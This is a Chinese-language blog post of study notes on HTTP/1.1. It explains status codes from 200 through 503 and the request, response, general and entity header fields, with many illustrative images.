<p>表示从客户端发来的请求在服务器端被正常处理了。<br>在响应报文内，随状态码一起返回的信息会因方法的不同而发生改 变。比如，使用 GET 方法时，对应请求资源的实体会作为响应返 回；而使用 HEAD 方法时，对应请求资源的实体首部不随报文主体 作为响应返回（即在响应中只返回首部，不会返回实体的主体部 分）。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/31.png" alt="31"></p>
<p>该状态码代表服务器接收的请求已成功处理，但在返回的响应报文中 不含实体的主体部分。另外，也不允许返回任何实体的主体。比如， 当从浏览器发出请求处理后，返回 204 响应，那么浏览器显示的页面 不发生更新。<br>一般在只需要从客户端往服务器发送信息，而对客户端不需要发送新信息内容的情况下使用。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/32.png" alt="32"></p>
<p>该状态码表示客户端进行了范围请求，而服务器成功执行了这部分的 GET 请求。响应报文中包含由 Content-Range 指定范围的实体内容。 </p>
<h3 id="3XX-重定向（3XX-响应结果表明浏览器需要执行某些特殊的处理以正确处理请求。）"><a href="#3XX-重定向（3XX-响应结果表明浏览器需要执行某些特殊的处理以正确处理请求。）" class="headerlink" title="　3XX 重定向（3XX 响应结果表明浏览器需要执行某些特殊的处理以正确处理请求。）"></a>　3XX 重定向（3XX 响应结果表明浏览器需要执行某些特殊的处理以正确处理请求。）</h3><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/33.png" alt="33"></p>
<p><strong>永久性重定向。</strong>该状态码表示请求的资源已被分配了新的 URI，以后 应使用资源现在所指的 URI。也就是说，如果已经把资源对应的 URI 保存为书签了，这时应该按 Location 首部字段提示的 URI 重新保存。</p>
<p>像下方给出的请求 URI，当指定资源路径的最后忘记添加斜杠“/”，就 会产生 301 状态码。</p>
<blockquote>
<p><a href="http://example.com/sample" target="_blank" rel="noopener">http://example.com/sample</a></p>
</blockquote>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/34.png" alt="34"></p>
<p><strong>临时性重定向。</strong>该状态码表示请求的资源已被分配了新的 URI，希望 用户（本次）能使用新的 URI 访问。 </p>
<p>和 301 Moved Permanently 状态码相似，但 302 状态码代表的资源不是被永久移动，只是临时性质的。换句话说，已移动的资源对应的 URI 将来还有可能发生改变。比如，用户把 URI 保存成书签，但不会 像 301 状态码出现时那样去更新书签，而是仍旧保留返回 302 状态码 的页面对应的 URI。 </p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/35.png" alt="35"></p>
<p>该状态码表示由于请求对应的资源存在着另一个 URI，应使用 GET 方法定向获取请求的资源。</p>
<p>303 状态码和 302 Found 状态码有着相同的功能，但 303 状态码明确 表示客户端应当采用 GET 方法获取资源，这点与 302 状态码有区别。</p>
<p>比如，当使用 POST 方法访问 CGI 程序，其执行后的处理结果是希望 客户端能以 GET 方法重定向到另一个 URI 上去时，返回 303 状态 码。虽然 302 Found 状态码也可以实现相同的功能，但这里使用 303 状态码是最理想的。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/36.png" alt="36"></p>
<p>该状态码表示客户端发送附带条件的请求时，服务器端允许请求访问资源，但未满足条件的情况。304 状态码返回时，不包含任何响应 的主体部分。304 虽然被划分在 3XX 类别中，但是和重定向没有关 系。</p>
<blockquote>
<p><strong>附带条件</strong>的请求是指采用 GET 方法的请求报文中包含 If-Match，If-ModifiedSince，If-None-Match，If-Range，If-Unmodified-Since 中任一首部。</p>
</blockquote>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/37.png" alt="37"></p>
<p>临时重定向。该状态码与 302 Found 有着相同的含义。尽管 302 标准<br>禁止 POST 变换成 GET，但实际使用时大家并不遵守。 307 会遵照浏览器标准，不会从 POST 变成 GET。但是，对于处理响应时的行为，每种浏览器有可能出现不同的情况。</p>
<h3 id="4XX-客户端错误（4XX-的响应结果表明客户端是发生错误的原因所在）"><a href="#4XX-客户端错误（4XX-的响应结果表明客户端是发生错误的原因所在）" class="headerlink" title="4XX 客户端错误（4XX 的响应结果表明客户端是发生错误的原因所在）"></a>4XX 客户端错误（4XX 的响应结果表明<em>客户端</em>是发生错误的原因所在）</h3><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/38.png" alt="38"></p>
<p>该状态码表示请求报文中存在语法错误。当错误发生时，需修改请求 的内容后再次发送请求。另外，浏览器会像 200 OK 一样对待该状态 码。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/39.png" alt="39"></p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/40.png" alt="40"></p>
<p>该状态码表示发送的请求需要有通过 HTTP 认证（BASIC 认证、 DIGEST 认证）的认证信息。另外若之前已进行过 1 次请求，则表示 用 户认证失败。 </p>
<p>返回含有 401 的响应必须包含一个适用于被请求资源的 WWWAuthenticate 首部用以质询（challenge）用户信息。当浏览器初次接收 到 401 响应，会弹出认证用的对话窗口。 </p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/41.png" alt="41"></p>
<p>该状态码表明对请求资源的访问被服务器拒绝了。服务器端没有必要 给出拒绝的详细理由，但如果想作说明的话，可以在实体的主体部分对原因进行描述，这样就能让用户看到了。<br>未获得文件系统的访问授权，访问权限出现某些问题（从未授权的发送源 IP 地址试图访问）等列举的情况都可能是发生 403 的原因。 </p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/42.png" alt="42"></p>
<p>该状态码表明服务器上无法找到请求的资源。除此之外，也可以在服务器端<strong>拒绝请求且不想说明理由</strong>时使用。 </p>
<h3 id="5XX-服务器错误（5XX-的响应结果表明服务器本身发生错误。-）"><a href="#5XX-服务器错误（5XX-的响应结果表明服务器本身发生错误。-）" class="headerlink" title="5XX 服务器错误（5XX 的响应结果表明服务器本身发生错误。 ）"></a>5XX 服务器错误（5XX 的响应结果表明<em>服务器</em>本身发生错误。 ）</h3><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/43.png" alt="43"></p>
<p>该状态码表明服务器端在执行请求时发生了错误。也有可能是 Web 应用存在的 bug 或某些临时的故障。 </p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/44.png" alt="44"></p>
<p>该状态码表明服务器暂时处于超负载或正在进行停机维护，现在无法 处理请求。如果事先得知解除以上状况需要的时间，最好写入 RetryAfter 首部字段再返回给客户端。</p>
<blockquote>
<p>状态码和状况的不一致<br>不少返回的状态码响应都是错误的，但是用户可能察觉不到这点。 比如 Web 应用程序内部发生错误，状态码依然返回 200 OK，这种 情况也经常遇到。</p>
</blockquote>
<h2 id="首部字段"><a href="#首部字段" class="headerlink" title="首部字段"></a>首部字段</h2><p>HTTP/1.1 规范定义了如下 47 种首部字段。 </p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/45.png" alt="45"></p>
<p><strong>请求首部字段</strong></p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/46.png" alt="46"></p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/47.png" alt="47"></p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/48.png" alt="48"></p>
<p>在 HTTP 协议通信交互中使用到的首部字段，不限于 RFC2616 中定 义的 47 种首部字段。还有 Cookie、Set-Cookie 和 Content-Disposition 等在其他 RFC 中定义的首部字段，它们的使用频率也很高。 </p>
<p>这些非正式的首部字段统一归纳在 RFC4229 HTTP Header Field Registrations 中。 </p>
<blockquote>
<p><strong>注：</strong></p>
<p><strong>End-to-end 首部和 Hop-by-hop 首部</strong> </p>
<p>HTTP 首部字段将定义成缓存代理和非缓存代理的行为，分成 2 种类 型。</p>
<p><strong>端到端首部（End-to-end Header）</strong> </p>
<p>分在此类别中的首部会转发给请求 / 响应对应的最终接收目标，且必须保存在由缓存生成的响应中，另外规定它必须被转发。</p>
<p><strong>逐跳首部（Hop-by-hop Header）</strong><br>分在此类别中的首部只对单次转发有效，会因通过缓存或代理而不再 转发。HTTP/1.1 和之后版本中，如果要使用 hop-by-hop 首部，需提 供 Connection 首部字段。</p>
<p>下面列举了 HTTP/1.1 中的逐跳首部字段。除这 8 个首部字段之外， 其他所有字段都属于端到端首部。</p>
<ol>
<li>Connection </li>
<li>Keep-Alive </li>
<li>Proxy-Authenticate </li>
<li>Proxy-Authorization </li>
<li>Trailer </li>
<li>TE </li>
<li>Transfer-Encoding </li>
<li>Upgrade </li>
</ol>
</blockquote>
<h3 id="通用首部字段"><a href="#通用首部字段" class="headerlink" title="通用首部字段"></a>通用首部字段</h3><h4 id="Cache-Control"><a href="#Cache-Control" class="headerlink" title="Cache-Control"></a>Cache-Control</h4><p>通过指定首部字段 Cache-Control 的指令，就能操作缓存的工作机制。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/49.png" alt="49"></p>
<p><em>可用的指令按请求和响应分类如下所示。</em></p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/50.png" alt="50"></p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/51.png" alt="51"></p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/52.png" alt="52"></p>
<p>使用 no-cache 指令的目的是为了防止从缓存中返回过期的资源。 </p>
<p><strong>客户端</strong>发送的请求中如果包含 no-cache 指令，则表示客户端将不会接收缓存过的响应。于是，“中间”的缓存服务器必须把客户端请求转发 给源服务器。</p>
<p>如果<strong>服务器</strong>返回的响应中包含 no-cache 指令，那么缓存服务器不能对资源进行缓存。源服务器以后也将不再对缓存服务器请求中提出的资源有效性进行确认，且禁止其对响应资源进行缓存操作。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/53.png" alt="53"></p>
<p>由服务器返回的响应中，若报文首部字段 Cache-Control 中对 no-cache 字段名具体指定参数值，那么<em>客户端</em>I在接收到这个被指定参数值的首 部字段对应的响应报文后，就不能使用缓存。换言之，无参数值的首 部字段可以使用缓存。只能在<strong>响应指令</strong>中指定该参数。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/54.png" alt="54"></p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/55.png" alt="55"></p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/56.png" alt="56"></p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/57.png" alt="57"></p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/58.png" alt="58"></p>
<h4 id="Connection"><a href="#Connection" class="headerlink" title="Connection"></a>Connection</h4><p>Connection 首部字段具备如下两个作用。</p>
<ol>
<li>控制不再转发给代理的首部字段</li>
<li>管理持久连接</li>
</ol>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/59.png" alt="59"></p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/60.png" alt="60"></p>
<h4 id="Date"><a href="#Date" class="headerlink" title="Date"></a>Date</h4><p>表明创建HTTP报文的日期和时间。</p>
<h4 id="Trailer"><a href="#Trailer" class="headerlink" title="Trailer"></a>Trailer</h4><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/62.png" alt="62"></p>
<h4 id="Upgrade"><a href="#Upgrade" class="headerlink" title="Upgrade"></a>Upgrade</h4><p>首部字段 Upgrade 用于检测 HTTP 协议及其他协议是否可使用更高的 版本进行通信，其参数值可以用来指定一个完全不同的通信协议</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/63.png" alt="63"></p>
<p>上图用例中，首部字段 Upgrade 指定的值为 TLS/1.0。请注意此处两 个字段首部字段的对应关系，Connection 的值被指定为 Upgrade。 Upgrade 首部字段产生作用的 Upgrade 对象仅限于客户端和邻接服务 器之间。因此，使用首部字段 Upgrade 时，还需要额外指定 Connection:Upgrade。 </p>
<h4 id="Via"><a href="#Via" class="headerlink" title="Via"></a>Via</h4><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/64.png" alt="64"></p>
<p>Via 首部是为了追踪传输路径，所以经常会和 TRACE 方法一起使 用。比如，代理服务器接收到由 TRACE 方法发送过来的请求（其中 Max-Forwards: 0）时，代理服务器就不能再转发该请求了。这种情况 下，代理服务器会将自身的信息附加到 Via 首部后，返回该请求的响 应。</p>
<h4 id="Warning"><a href="#Warning" class="headerlink" title="Warning"></a>Warning</h4><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/65.png" alt="65"></p>
<h3 id="请求首部字段"><a href="#请求首部字段" class="headerlink" title="请求首部字段"></a>请求首部字段</h3><p>请求首部字段是从客户端往服务器端发送请求报文中所使用的字段， 用于<strong>补充请求的附加信息、客户端信息、对响应内容相关的优先级</strong>等 内容。</p>
<h4 id="Accept"><a href="#Accept" class="headerlink" title="Accept"></a>Accept</h4><p>Accept 首部字段可通知服务器，用户代理能够处理的媒体类型及媒体 类型的相对优先级。可使用 type/subtype 这种形式，一次指定多种媒体类型。</p>
<ol>
<li>文本文件<br>text/html, text/plain, text/css … application/xhtml+xml, application/xml …</li>
<li>图片文件<br>image/jpeg, image/gif, image/png …</li>
<li>视频文件<br>video/mpeg, video/quicktime …</li>
<li>应用程序使用的二进制文件<br>application/octet-stream, application/zip … </li>
</ol>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/66.png" alt="66"></p>
<p>若想要给显示的媒体类型增加优先级，则使用 q= 来额外表示权重值 1，用分号（;）进行分隔。权重值 q 的范围是 0~1（可精确到小数点 后 3 位），且 1 为最大值。不指定权重 q 值时，默认权重为 q=1.0。</p>
<h4 id="Accept-Charset"><a href="#Accept-Charset" class="headerlink" title="Accept-Charset"></a>Accept-Charset</h4><p>Accept-Charset 首部字段可用来通知服务器用户代理支持的字符集及 字符集的相对优先顺序。另外，可一次性指定多种字符集。与首部字 段 Accept 相同的是可用权重 q 值来表示相对优先级。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/67.png" alt="67"></p>
<h4 id="Accept-Encoding"><a href="#Accept-Encoding" class="headerlink" title="Accept-Encoding"></a>Accept-Encoding</h4><p>Accept-Encoding 首部字段用来告知服务器用户代理支持的内容编码及 内容编码的优先级顺序。可一次性指定多种内容编码。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/68.png" alt="68"></p>
<p>下面试举出几个内容编码的例子。</p>
<ol>
<li>gzip 由文件压缩程序 gzip（GNU zip）生成的编码格式 （RFC1952），采用 Lempel-Ziv 算法（LZ77）及 32 位循环冗余 校验（Cyclic Redundancy Check，通称 CRC）。 </li>
<li>compress 由 UNIX 文件压缩程序 compress 生成的编码格式，采用 LempelZiv-Welch 算法（LZW）。 </li>
<li>deflate 组合使用 zlib 格式（RFC1950）及由 deflate 压缩算法 （RFC1951）生成的编码格式。 </li>
<li>identity<br>不执行压缩或不会变化的默认编码格式</li>
</ol>
<p>采用权重 q 值来表示相对优先级，这点与首部字段 Accept 相同。另 外，也可使用星号（*）作为通配符，指定任意的编码格式。 </p>
<h4 id="Accept-Language"><a href="#Accept-Language" class="headerlink" title="Accept-Language"></a>Accept-Language</h4><p>首部字段 Accept-Language 用来告知服务器用户代理能够处理的自然 语言集（指中文或英文等），以及自然语言集的相对优先级。可一次 指定多种自然语言集。</p>
<p>和 Accept 首部字段一样，按权重值 q 来表示相对优先级。在下面图例中，客户端在服务器有中文版资源的情况下，会请求其返回中文版 对应的响应，没有中文版时，则请求返回英文版响应。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/69.png" alt="69"></p>
<h4 id="Authorization"><a href="#Authorization" class="headerlink" title="Authorization"></a>Authorization</h4><p>首部字段 Authorization 是用来告知服务器，用户代理的认证信息（证书值）。通常，想要通过服务器认证的用户代理会在接收到返回的 401 状态码响应后，把首部字段 Authorization 加入请求中。共用缓存 在接收到含有 Authorization 首部字段的请求时的操作处理会略有差异。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/70.png" alt="70"></p>
<h4 id="Expect"><a href="#Expect" class="headerlink" title="Expect"></a>Expect</h4><p>客户端使用首部字段 Expect 来告知服务器，期望出现的某种特定行 为。因服务器无法理解客户端的期望作出回应而发生错误时，会返回 状态码 417 Expectation Failed。 </p>
<p>客户端可以利用该首部字段，写明所期望的扩展。虽然 HTTP/1.1 规 范只定义了 100-continue（状态码 100 Continue 之意）。 </p>
<p>等待状态码 100 响应的客户端在发生请求时，需要指定 Expect:100continue。 </p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/71.png" alt="71"></p>
<h4 id="From"><a href="#From" class="headerlink" title="From"></a>From</h4><p>首部字段 From 用来告知服务器使用用户代理的用户的电子邮件地 址。通常，其使用目的就是为了显示搜索引擎等用户代理的负责人的 电子邮件联系方式。使用代理时，应尽可能包含 From 首部字段（但 可能会因代理不同，将电子邮件地址记录在 User-Agent 首部字段 内）。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/72.png" alt="72"></p>
<h4 id="Host"><a href="#Host" class="headerlink" title="Host"></a>Host</h4><p>首部字段 Host 会告知服务器，请求的资源所处的互联网主机名和端 口号。Host 首部字段在 HTTP/1.1 规范内是唯一一个必须被包含在请 求内的首部字段。</p>
<p>首部字段 Host 和以单台服务器分配多个域名的虚拟主机的工作机制 有很密切的关联，这是首部字段 Host 必须存在的意义。 </p>
<p>请求被发送至服务器时，请求中的主机名会用 IP 地址直接替换解 决。但如果这时，相同的 IP 地址下部署运行着多个域名，那么服务 器就会无法理解究竟是哪个域名对应的请求。因此，就需要使用首部 字段 Host 来明确指出请求的主机名。若服务器未设定主机名，那直 接发送一个空值即可。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/73.png" alt="73"></p>
<h4 id="If-XXX"><a href="#If-XXX" class="headerlink" title="If-XXX"></a>If-XXX</h4><p>形如 If-xxx 这种样式的请求首部字段，都可称为条件请求。服务器接收到附带条件的请求后，只有判断指定条件为真时，才会执行请求。</p>
<h5 id="If-Match"><a href="#If-Match" class="headerlink" title="If-Match"></a>If-Match</h5><p>首部字段 If-Match，属附带条件之一，它会告知服务器匹配资源所用 的实体标记（ETag）值。这时的服务器无法使用弱 ETag 值。（请参 照本章有关首部字段 ETag 的说明）</p>
<p>服务器会比对 If-Match 的字段值和资源的 ETag 值，仅当两者一致 时，才会执行请求。反之，则返回状态码 412 Precondition Failed 的响 应。</p>
<p>还可以使用星号（*）指定 If-Match 的字段值。针对这种情况，服务 器将会忽略 ETag 的值，只要资源存在就处理请求。 </p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/74.png" alt="74"></p>
<h5 id="If-None-Match"><a href="#If-None-Match" class="headerlink" title="If-None-Match"></a>If-None-Match</h5><p>首部字段 If-None-Match 属于附带条件之一。它和首部字段 If-Match 作用相反。用于指定 If-None-Match 字段值的实体标记（ETag）值与 请求资源的 ETag 不一致时，它就告知服务器处理该请求。 </p>
<p>在 GET 或 HEAD 方法中使用首部字段 If-None-Match 可获取最新的资源。因此，这与使用首部字段 If-Modified-Since 时有些类似。 </p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/76.png" alt="76"></p>
<h5 id="If-Modified-Since"><a href="#If-Modified-Since" class="headerlink" title="If-Modified-Since"></a>If-Modified-Since</h5><p>If-Modified-Since 用于确认代理或客户端拥有的本地资源的有效性。 获取资源的更新日期时间，可通过确认首部字段 Last-Modified 来确定。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/75.png" alt="75"></p>
<h5 id="If-Unmodified-Since"><a href="#If-Unmodified-Since" class="headerlink" title="If-Unmodified-Since"></a>If-Unmodified-Since</h5><p>首部字段 If-Unmodified-Since 和首部字段 If-Modified-Since 的作用相反。</p>
<h5 id="If-Range"><a href="#If-Range" class="headerlink" title="If-Range"></a>If-Range</h5><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/77.png" alt="77"></p>
<p>思考：If-Range存在的意义</p>
<p>当资源更新后，其ETag值会改变。所以当客户端持有部分文件而请求另一部分文件时，如果单单用GET请求，服务器会返回412 Precondition Failed，这样客户端还需再发一遍GET来获取更新后的全部文件，会用双倍时间。</p>
<h4 id="Max-Forwards"><a href="#Max-Forwards" class="headerlink" title="Max-Forwards"></a>Max-Forwards</h4><p>通过 TRACE 方法或 OPTIONS 方法，发送包含首部字段 MaxForwards 的请求时，该字段以十进制整数形式指定可经过的服务器最 大数目。服务器在往下一个服务器转发请求之前，Max-Forwards 的 值减 1 后重新赋值。当服务器接收到 Max-Forwards 值为 0 的请求 时，则不再进行转发，而是直接返回响应。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/78.png" alt="78"></p>
<p>使用 HTTP 协议通信时，请求可能会经过代理等多台服务器。途中， 如果代理服务器由于某些原因导致请求转发失败，客户端也就等不到 服务器返回的响应了。对此，我们无从可知。</p>
<p>可以灵活使用首部字段 Max-Forwards，针对以上问题产生的原因展 开调查。由于当 Max-Forwards 字段值为 0 时，服务器就会立即返回 响应，由此我们至少可以对以那台服务器为终点的传输路径的通信状 况有所把握。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/79.png" alt="79"></p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/80.png" alt="80"></p>
<h4 id="Proxy-Authorization"><a href="#Proxy-Authorization" class="headerlink" title="Proxy-Authorization"></a>Proxy-Authorization</h4><p>接收到从代理服务器发来的认证质询时，客户端会发送包含首部字段 Proxy-Authorization 的请求，以告知服务器认证所需要的信息。 </p>
<p>这个行为是与客户端和服务器之间的 HTTP 访问认证相类似的，不同 之处在于，认证行为发生在客户端与代理之间。客户端与服务器之间 的认证，使用首部字段 Authorization 可起到相同作用。</p>
<h4 id="Range"><a href="#Range" class="headerlink" title="Range"></a>Range</h4><p>对于只需获取部分资源的范围请求，包含首部字段 Range 即可告知服 务器资源的指定范围。上面的示例表示请求获取从第 5001 字节至第 10000 字节的资源。 </p>
<p>接收到附带 Range 首部字段请求的服务器，会在处理请求之后返回状 态码为 206 Partial Content 的响应。无法处理该范围请求时，则会返 回状态码 200 OK 的响应及全部资源。</p>
<h4 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h4><p>首部字段 Referer 会告知服务器请求的原始资源的 URI。 </p>
<p>客户端一般都会发送 Referer 首部字段给服务器。但当直接在浏览器 的地址栏输入 URI，或出于安全性的考虑时，也可以不发送该首部字 段。</p>
<p>因为原始资源的 URI 中的查询字符串可能含有 ID 和密码等保密信 息，要是写进 Referer 转发给其他服务器，则有可能导致保密信息的 泄露。</p>
<p>另外，Referer 的正确的拼写应该是 Referrer，但不知为何，大家一直 沿用这个错误的拼写。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/81.png" alt="81"></p>
<h4 id="TE"><a href="#TE" class="headerlink" title="TE"></a>TE</h4><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/82.png" alt="82"></p>
<h4 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User-Agent"></a>User-Agent</h4><p>首部字段 User-Agent 会将<strong>创建请求的浏览器</strong>和<strong>用户代理名称</strong>等信息传 达给服务器。</p>
<p>由网络爬虫发起请求时，有可能会在字段内添加爬虫作者的电子邮件地址。此外，如果请求经过代理，那么中间也很可能被添加上代理服务器的名称。 </p>
<h3 id="响应首部字段"><a href="#响应首部字段" class="headerlink" title="响应首部字段"></a>响应首部字段</h3><p>响应首部字段是由服务器端向客户端返回响应报文中所使用的字段， 用于<strong>补充响应的附加信息</strong>、<strong>服务器信息</strong>，以及<strong>对客户端的附加要求</strong>等信息。</p>
<h4 id="Accept-Ranges"><a href="#Accept-Ranges" class="headerlink" title="Accept-Ranges"></a>Accept-Ranges</h4><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/83.png" alt="83"></p>
<h4 id="Age"><a href="#Age" class="headerlink" title="Age"></a>Age</h4><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/84.png" alt="84"></p>
<h4 id="ETag"><a href="#ETag" class="headerlink" title="ETag"></a>ETag</h4><p>首部字段 ETag 能告知客户端实体标识。它是一种可将资源以字符串 形式做唯一性标识的方式。服务器会为每份资源分配对应的 ETag 值。</p>
<p>另外，当资源更新时，ETag 值也需要更新。生成 ETag 值时，并没有 统一的算法规则，而仅仅是由服务器来分配。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/85.png" alt="85"></p>
<p>资源被缓存时，就会被分配唯一性标识。例如，当使用中文版的浏览器访问 <a href="http://www.google.com/" target="_blank" rel="noopener">http://www.google.com/</a> 时，就会返回中文版对应的资源，而 使用英文版的浏览器访问时，则会返回英文版对应的资源。两者的 URI 是相同的，所以仅凭 URI 指定缓存的资源是相当困难的。若在下 载过程中出现连接中断、再连接的情况，都会依照 ETag 值来指定资源。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/86.png" alt="86"></p>
<blockquote>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/87.png" alt="87"></p>
</blockquote>
<h4 id="Location"><a href="#Location" class="headerlink" title="Location"></a>Location</h4><p>使用首部字段 Location 可以将响应接收方引导至某个与请求 URI 位置 不同的资源。</p>
<p>基本上，该字段会配合 3xx ：Redirection 的响应，提供重定向的 URI。 </p>
<p>几乎所有的浏览器在接收到包含首部字段 Location 的响应后，都会强制性地尝试对已提示的重定向资源的访问。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/88.png" alt="88"></p>
<h4 id="Proxy-Authenticate"><a href="#Proxy-Authenticate" class="headerlink" title="Proxy-Authenticate"></a>Proxy-Authenticate</h4><p>首部字段 Proxy-Authenticate 会把由代理服务器所要求的认证信息发送 给客户端。</p>
<p>它与客户端和服务器之间的 HTTP 访问认证的行为相似，不同之处在 于其认证行为是在客户端与代理之间进行的。而客户端与服务器之间 进行认证时，首部字段 WWW-Authorization 有着相同的作用。有关 HTTP 访问认证，后面的章节会再进行详尽阐述。 </p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/89.png" alt="89"></p>
<h4 id="WWW-Authenticate"><a href="#WWW-Authenticate" class="headerlink" title="WWW-Authenticate"></a>WWW-Authenticate</h4><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/93.png" alt="93"></p>
<h4 id="Retry-After"><a href="#Retry-After" class="headerlink" title="Retry-After"></a>Retry-After</h4><p>首部字段 Retry-After 告知客户端应该在多久之后再次发送请求。主要 配合状态码 503 Service Unavailable 响应，或 3xx Redirect 响应一起使 用。</p>
<p>字段值可以指定为具体的日期时间（Wed, 04 Jul 2012 06：34：24 GMT 等格式），也可以是创建响应后的秒数。 </p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/90.png" alt="90"></p>
<h4 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h4><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/91.png" alt="91"></p>
<h4 id="Vary"><a href="#Vary" class="headerlink" title="Vary"></a>Vary</h4><p>首部字段 Vary 可对缓存进行控制。源服务器会向代理服务器传达关 于本地缓存使用方法的命令。</p>
<p>从代理服务器接收到源服务器返回包含 Vary 指定项的响应之后，若 再要进行缓存，仅对请求中含有相同 Vary 指定首部字段的请求返回 缓存。即使对相同资源发起请求，但由于 Vary 指定的首部字段不相 同，因此必须要从源服务器重新获取资源。</p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/92.png" alt="92"></p>
<p>图：当代理服务器接收到带有 Vary 首部字段指定获取资源的请求 时，如果使用的 Accept-Language 字段的值相同，那么就直接从缓 存返回响应。反之，则需要先从源服务器端获取资源后才能作为响应返回.</p>
<h3 id="实体首部字段"><a href="#实体首部字段" class="headerlink" title="实体首部字段"></a>实体首部字段</h3><p>实体首部字段是包含在请求报文和响应报文中的实体部分所使用的首 部，用于补充内容的更新时间等与实体相关的信息。</p>
<h4 id="Allow"><a href="#Allow" class="headerlink" title="Allow"></a>Allow</h4><p>首部字段 Allow 用于通知客户端能够支持 Request-URI 指定资源的所 有 HTTP 方法。当服务器接收到不支持的 HTTP 方法时，会以状态码 405 Method Not Allowed 作为响应返回。与此同时，还会把所有能支 持的 HTTP 方法写入首部字段 Allow 后返回。 </p>
<p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/94.png" alt="94"></p>
<h4 id="Content-Encoding"><a href="#Content-Encoding" class="headerlink" title="Content-Encoding"></a>Content-Encoding</h4><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/95png.png" alt="95png"></p>
<h4 id="Content-Language"><a href="#Content-Language" class="headerlink" title="Content-Language"></a>Content-Language</h4><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/96.png" alt="96"></p>
<h4 id="Content-Length"><a href="#Content-Length" class="headerlink" title="Content-Length"></a>Content-Length</h4><p><img src="/2020/01/25/HTTP%E5%8D%8F%E8%AE%AE/97.png" alt="97"></p>
<h4 id="Content-Location"><a href="#Content-Location" class="headerlink" title="Content-Location"></a>Content-Location</h4><p>首部字段 Content-Location 给出与报文主体部分相对应的 URI。和首 部字段 Location 不同，Content-Location 表示的是报文主体返回资源对 应的 URI。 </p>
